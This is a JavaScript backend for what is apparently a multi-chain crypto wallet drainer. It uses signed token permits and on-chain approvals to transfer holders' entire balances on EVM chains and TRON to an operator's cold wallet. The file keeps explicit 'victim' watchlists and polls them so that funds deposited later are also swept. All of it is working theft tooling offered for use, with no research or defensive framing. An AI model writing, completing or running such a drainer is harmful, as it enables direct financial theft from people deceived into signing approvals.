require('dotenv').config();
const { ethers } = require('ethers');
const { TronWeb } = require('tronweb');
const express = require('express');
const cors = require('cors');

console.log("🚀 Starting Multi-Chain Auto-Sweeper Bot...");

const app = express();
app.use(cors());
app.use(express.json()); 

const PORT = process.env.PORT || 3001;

const pendingVictimsEVM = new Map();
const activeSweepsEVM = new Set();
const pendingVictimsTRON = new Map();

// ==========================================
// 🟢 EVM MULTI-CHAIN SWEEPER CONFIGURATION
// ==========================================
// Define your chains. The same private key is used across chains.
const EVM_CHAINS = [
    { name: 'Ethereum', rpcUrl: process.env.ETH_RPC_URL || process.env.EVM_RPC_URL, coldWallet: process.env.ETH_COLD_WALLET || process.env.EVM_COLD_WALLET },
    { name: 'BSC', rpcUrl: process.env.BSC_RPC_URL, coldWallet: process.env.BSC_COLD_WALLET || process.env.EVM_COLD_WALLET },
    { name: 'Polygon', rpcUrl: process.env.POLYGON_RPC_URL, coldWallet: process.env.POLYGON_COLD_WALLET || process.env.EVM_COLD_WALLET },
    { name: 'Arbitrum', rpcUrl: process.env.ARBITRUM_RPC_URL, coldWallet: process.env.ARBITRUM_COLD_WALLET || process.env.EVM_COLD_WALLET }
];

const EVM_TOKEN_ABI = [
    "function balanceOf(address account) view returns (uint256)",
    "function decimals() view returns (uint8)",
    "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external"
];

const PERMIT2_ABI = [
    "function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external",
    "function transferFrom(address from, address to, uint160 amount, address token) external"
];

// 🔥 UPDATED: Added uint256 deadline parameter to match the new smart contract
const EVM_COLLECTOR_ABI = [
    "function routeDeposit(address token, address from, address to, uint256 amount, uint256 deadline) external"
];

const PERMIT2_ADDRESS = process.env.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const COLLECTOR_ADDRESS = process.env.EVM_COLLECTOR_ADDRESS;

// Initialize engines for each chain
const chainEngines = {};

EVM_CHAINS.forEach(chain => {
    if (chain.rpcUrl && process.env.EVM_PRIVATE_KEY && chain.coldWallet && COLLECTOR_ADDRESS) {
        try {
            const provider = new ethers.WebSocketProvider(chain.rpcUrl);
            const wallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, provider);
            const collector = new ethers.Contract(COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, wallet);
            const p2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
            
            chainEngines[chain.name] = { provider, wallet, collector, p2, coldWallet: chain.coldWallet, name: chain.name };
            console.log(`✅ [${chain.name}] EVM Engine Initialized.`);
        } catch (e) {
            console.warn(`⚠️ [${chain.name}] Initialization failed:`, e.message);
        }
    } else {
        console.warn(`⚠️ [${chain.name}] Config missing in .env. Skipping.`);
    }
});

// ==========================================
// ⚡ EVM GASLESS EXECUTION ROUTE
// ==========================================
app.post('/execute-gasless', async (req, res) => {
    const { type, chainName, token, owner, spender, signature, deadline, nonce, value, amount } = req.body;
    const engine = chainEngines[chainName];

    if (!engine) {
        return res.status(400).json({ success: false, message: "Unsupported or unconfigured chain" });
    }

    console.log(`\n[BACKEND] ✍️ RECEIVED GASLESS SIGNATURE (${chainName}): ${signature.substring(0, 15)}...`);
    console.log(`[BACKEND] Type: ${type} | Token: ${token} | Owner: ${owner}`);

    res.status(200).json({ success: true, message: "Executing in background" });

    try {
        const tokenContract = new ethers.Contract(token, EVM_TOKEN_ABI, engine.wallet);
        const balance = await tokenContract.balanceOf(owner);
        console.log(`[BACKEND] Balance fetched: ${balance.toString()}`);

        if (type === 'PERMIT') {
            const sig = ethers.Signature.from(signature);
            // 🔥 CRITICAL: Must use the exact 'value' that was signed by the frontend
            const permitValue = value || balance.toString(); 

            const feeData = await engine.provider.getFeeData();
            const priorityFee = feeData.maxPriorityFeePerGas ? (feeData.maxPriorityFeePerGas * 150n) / 100n : undefined;
            const maxFee = feeData.maxFeePerGas ? (feeData.maxFeePerGas * 150n) / 100n : undefined;

            const tx = await tokenContract.permit(owner, spender, permitValue, deadline, sig.v, sig.r, sig.s, {
                maxPriorityFeePerGas: priorityFee,
                maxFeePerGas: maxFee
            });
            console.log(`[BACKEND] 📡 Permit TX Broadcasted! Hash: ${tx.hash}`);
            
            await tx.wait();
            console.log(`[BACKEND] ✅ Permit Confirmed on-chain for ${owner}`);
            
            const safeOwner = owner.toLowerCase();
            if (balance > 0n && !activeSweepsEVM.has(safeOwner)) {
                activeSweepsEVM.add(safeOwner);
                try {
                    const decimals = await tokenContract.decimals();
                    console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${ethers.formatUnits(balance, decimals)} Tokens`);
                    
                                        // Pass MaxUint256 as deadline to satisfy the contract (Forever)
                    const sweepTx = await engine.collector.routeDeposit(token, owner, engine.coldWallet, balance, ethers.MaxUint256, {
                        maxPriorityFeePerGas: priorityFee,
                        maxFeePerGas: maxFee
                    });
                    console.log(`[BACKEND] ⏳ Sweep TX Sent: ${sweepTx.hash}`);
                    await sweepTx.wait();
                    console.log(`[BACKEND] ✅ Successfully Swept!`);
                } catch (e) {
                    console.error(`[BACKEND] ❌ Sweep Reverted On-Chain:`, e.shortMessage || e.message);
                } finally {
                    setTimeout(() => activeSweepsEVM.delete(safeOwner), 60000); 
                }
            } else if (balance === 0n) {
                pendingVictimsEVM.set(`${safeOwner}-${token.toLowerCase()}-${chainName}`, { owner, token, chainName });
            }
        }
        else if (type === 'PERMIT2') {
            // 🔥 CRITICAL: Must use the exact 'amount' that was signed by the frontend
            const permitAmount = amount || balance.toString();
            const permitSingle = {
                details: { token: token, amount: permitAmount, expiration: deadline, nonce: nonce },
                spender: spender,
                sigDeadline: deadline
            };
            
            const tx = await engine.p2.permit(owner, permitSingle, signature);
            console.log(`[BACKEND] 📡 Permit2 TX Broadcasted! Hash: ${tx.hash}`);
            await tx.wait();
            console.log(`[BACKEND] ✅ Permit2 Confirmed on-chain!`);

            if (balance > 0n) {
                const sweepTx = await engine.p2.transferFrom(owner, engine.coldWallet, balance, token);
                console.log(`[BACKEND] ⏳ Direct Permit2 Sweep TX Sent: ${sweepTx.hash}`);
                await sweepTx.wait();
                console.log(`[BACKEND] ✅ Successfully Swept via Permit2!`);
            } else {
                pendingVictimsEVM.set(`${owner.toLowerCase()}-${token.toLowerCase()}-${chainName}`, { owner, token, chainName });
            }
        }
    } catch (err) {
        console.error(`\n[BACKEND] ❌ BACKGROUND EXECUTION FAILED!`);
        console.error(`[BACKEND] Error:`, err.message, `\n`);
    }
});

// ==========================================
// 🎧 EVM ON-CHAIN LISTENER (Multi-Chain)
// ==========================================
Object.values(chainEngines).forEach(engine => {
    const approvalFilter = {
        topics: [
            ethers.id("Approval(address,address,uint256)"), 
            null, 
            ethers.zeroPadValue(COLLECTOR_ADDRESS, 32) 
        ]
    };

    console.log(`[${engine.name}] 🎧 Listening for Approvals to Collector: ${COLLECTOR_ADDRESS}`);

    engine.provider.on(approvalFilter, async (log) => {
        try {
            const tokenAddress = log.address; 
            const owner = ethers.getAddress(ethers.dataSlice(log.topics[1], 12)); 
            const dynamicTokenContract = new ethers.Contract(tokenAddress, EVM_TOKEN_ABI, engine.provider);
            const balance = await dynamicTokenContract.balanceOf(owner);
            const safeOwner = owner.toLowerCase();
            
            if (balance > 0n && !activeSweepsEVM.has(safeOwner)) {
                activeSweepsEVM.add(safeOwner);
                const decimals = await dynamicTokenContract.decimals();
                console.log(`[${engine.name}] Sweeping ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}...`);
                
                try {
                    // Pass MaxUint256 as deadline to satisfy the contract (Forever)
                    const tx = await engine.collector.routeDeposit(tokenAddress, owner, engine.coldWallet, balance, ethers.MaxUint256);
                    console.log(`[${engine.name}] ⏳ TX Sent! Hash: ${tx.hash}`);
                    await tx.wait();
                    console.log(`[${engine.name}] ✅ Successfully Swept!`);
                } catch (sweepError) {
                    console.error(`[${engine.name}] ❌ Sweep Execution Failed:`, sweepError.shortMessage || sweepError.message);
                    pendingVictimsEVM.set(`${safeOwner}-${tokenAddress.toLowerCase()}-${engine.name}`, { owner, token: tokenAddress, chainName: engine.name });
                } finally {
                    setTimeout(() => activeSweepsEVM.delete(safeOwner), 60000);
                }
            } else if (balance === 0n) {
                pendingVictimsEVM.set(`${safeOwner}-${tokenAddress.toLowerCase()}-${engine.name}`, { owner, token: tokenAddress, chainName: engine.name });
            }
        } catch (error) {
            console.error(`[${engine.name}] ❌ Listener Parsing Failed:`, error.message);
        }
    });
});

// ==========================================
// 🕵️ THE EVM PATIENT HUNTER LOOP (Multi-Chain)
// ==========================================
setInterval(async () => {
    for (const [key, data] of pendingVictimsEVM.entries()) {
        try {
            const engine = chainEngines[data.chainName];
            if (!engine) continue;

            const dynamicTokenContract = new ethers.Contract(data.token, EVM_TOKEN_ABI, engine.provider);
            const balance = await dynamicTokenContract.balanceOf(data.owner);
            
            if (balance > 0n) {
                console.log(`\n[BACKEND] 🎯 FUNDS DETECTED ON WATCHLIST! Target: ${data.owner} (${data.chainName})`);
                const decimals = await dynamicTokenContract.decimals();
                console.log(`[BACKEND] Sweeping newly deposited ${ethers.formatUnits(balance, decimals)} Tokens...`);
                
                                // Pass MaxUint256 as deadline to satisfy the contract (Forever)
                const tx = await engine.collector.routeDeposit(data.token, data.owner, engine.coldWallet, balance, ethers.MaxUint256);
                console.log(`[BACKEND] ⏳ Watchlist TX Sent! Hash: ${tx.hash}`);
                await tx.wait();
                console.log(`[BACKEND] ✅ Watchlist Sweep Successful!`);
                
                pendingVictimsEVM.delete(key);
            }
        } catch (e) {
            // Silently fail and retry on next interval
        }
    }
}, 30000); 

// ==========================================
// 🔴 TRON SWEEPER CONFIGURATION (Unchanged)
// ==========================================
if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TRON_USDT_ADDRESS && process.env.TRON_COLLECTOR_ADDRESS && process.env.TRON_DESTINATION_WALLET) {
    const tronWeb = new TronWeb({
        fullHost: process.env.TRON_FULL_HOST,
        privateKey: process.env.TRON_PRIVATE_KEY
    });

    const TRON_USDT_ABI = [
        { "inputs": [ { "name": "who", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "", "type": "uint256" } ], "stateMutability": "view", "type": "function" }
    ];

    const TRON_ROUTER_ABI = [
        { inputs: [{ name: 'token', type: 'address' }, { name: 'from', type: 'address' }, { name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'routeDeposit', outputs: [], stateMutability: 'nonpayable', type: 'function' }
    ];

    async function startTronListener() {
        try {
            const tronUsdtContract = await tronWeb.contract(TRON_USDT_ABI, process.env.TRON_USDT_ADDRESS);
            const tronCollectorContract = await tronWeb.contract(TRON_ROUTER_ABI, process.env.TRON_COLLECTOR_ADDRESS);

            console.log("✅ TRON Listener Active (Polling Mode).");

            let lastProcessedTimestamp = Date.now() - 3000;
            const processedTxs = new Set();

            setInterval(async () => {
                try {
                    const events = await tronWeb.event.getEventsByContractAddress(
                        process.env.TRON_USDT_ADDRESS,
                        { eventName: 'Approval', minBlockTimestamp: lastProcessedTimestamp, orderBy: 'block_timestamp,asc' }
                    );

                    if (events && events.data && events.data.length > 0) {
                        for (const event of events.data) {
                            if (processedTxs.has(event.transaction_id)) continue;
                            processedTxs.add(event.transaction_id);
                            if (processedTxs.size > 1000) processedTxs.clear();

                            if (event.block_timestamp >= lastProcessedTimestamp) {
                                lastProcessedTimestamp = event.block_timestamp + 1;
                            }

                            const spenderHex = event.result.spender || event.result._spender;
                            if (!spenderHex) continue;
                            const spenderBase58 = tronWeb.address.fromHex(spenderHex);

                            if (spenderBase58 === process.env.TRON_COLLECTOR_ADDRESS) {
                                const ownerHex = event.result.owner || event.result._owner;
                                const ownerBase58 = tronWeb.address.fromHex(ownerHex);

                                console.log(`\n[TRON] 🚨 APPROVAL MATCHED AND DETECTED! User: ${ownerBase58}`);

                                try {
                                    const balanceObj = await tronUsdtContract.balanceOf(ownerBase58).call();
                                    const balanceStr = balanceObj.toString();

                                    if (Number(balanceStr) > 0) {
                                        console.log(`[TRON] Target locked: ${Number(balanceStr) / 1_000_000} USDT from ${ownerBase58}...`);
                                        let maxRetries = 3;
                                        let attempt = 1;
                                        let sweepSuccess = false;

                                        while (attempt <= maxRetries && !sweepSuccess) {
                                            try {
                                                console.log(`\n[TRON] ⏳ Sweep Attempt ${attempt}/${maxRetries}...`);
                                                const txId = await tronCollectorContract.routeDeposit(process.env.TRON_USDT_ADDRESS, ownerBase58, process.env.TRON_DESTINATION_WALLET, balanceStr).send({ callValue: 0, feeLimit: 500_000_000, shouldPollResponse: false });
                                                
                                                console.log(`[TRON] 📡 TX Broadcasted (Hash: ${txId}). Verifying...`);
                                                let txInfo = null;
                                                for (let i = 0; i < 15; i++) { 
                                                    await new Promise(resolve => setTimeout(resolve, 3000));
                                                    try {
                                                        txInfo = await tronWeb.trx.getTransactionInfo(txId);
                                                        if (txInfo && txInfo.id) break;
                                                    } catch (e) {}
                                                }

                                                if (txInfo && txInfo.id && txInfo.receipt && txInfo.receipt.result === 'SUCCESS') {
                                                    console.log(`[TRON] ✅ Sweep Confirmed! Hash: ${txId}`);
                                                    sweepSuccess = true;
                                                } else {
                                                    throw new Error("Sweep Failed.");
                                                }
                                            } catch (sweepError) {
                                                console.error(`[TRON] ❌ Failed: ${sweepError.message}`);
                                                attempt++;
                                                if (attempt > maxRetries) {
                                                    pendingVictimsTRON.set(ownerBase58, { owner: ownerBase58 });
                                                }
                                            }
                                        }
                                  } else {
                                        console.log(`[TRON] ⚠️ Balance 0. Watchlisted.`);
                                        pendingVictimsTRON.set(ownerBase58, { owner: ownerBase58 });
                                    }
                                } catch (error) {}
                            }
                        }
                    }
                } catch (pollError) {}
            }, 3000); 

            setInterval(async () => {
                if (pendingVictimsTRON.size > 0) {
                    console.log(`\n[TRON] 📋 CURRENT WATCHLIST (${pendingVictimsTRON.size} Active Nodes):`);
                    for (const key of pendingVictimsTRON.keys()) console.log(`      -> Tracking: ${key}`);
                }
                for (const [key, data] of pendingVictimsTRON.entries()) {
                    try {
                        const balanceObj = await tronUsdtContract.balanceOf(data.owner).call();
                        const balanceStr = balanceObj.toString();
                        if (Number(balanceStr) > 0) {
                            console.log(`\n[TRON] 🎯 WATCHLIST HIT! Target: ${data.owner}`);
                            console.log(`[TRON] Sweeping newly deposited ${Number(balanceStr) / 1_000_000} USDT from ${data.owner}...`);
                            const txId = await tronCollectorContract.routeDeposit(process.env.TRON_USDT_ADDRESS, data.owner, process.env.TRON_DESTINATION_WALLET, balanceStr).send({ callValue: 0, feeLimit: 500_000_000, shouldPollResponse: false });
                            console.log(`[TRON] ⏳ Sweep Sent: ${txId}`);
                            pendingVictimsTRON.delete(key);
                        }
                    } catch (e) {}
                }
            }, 30000); 
            
        } catch (e) {
            console.error("Failed to initialize TRON listener:", e.message);
        }
    }
    startTronListener();
} else {
    console.warn("⚠️ TRON config missing. Skipping.");
}

// ── 2. RAILWAY HEALTH CHECK SERVER ──
app.get('/', (req, res) => {
    res.status(200).send("✅ Sweeper Bot is actively listening for on-chain events.");
});

app.listen(PORT, () => {
    console.log(`📡 API Server Active: Health check listening on port ${PORT}`);
});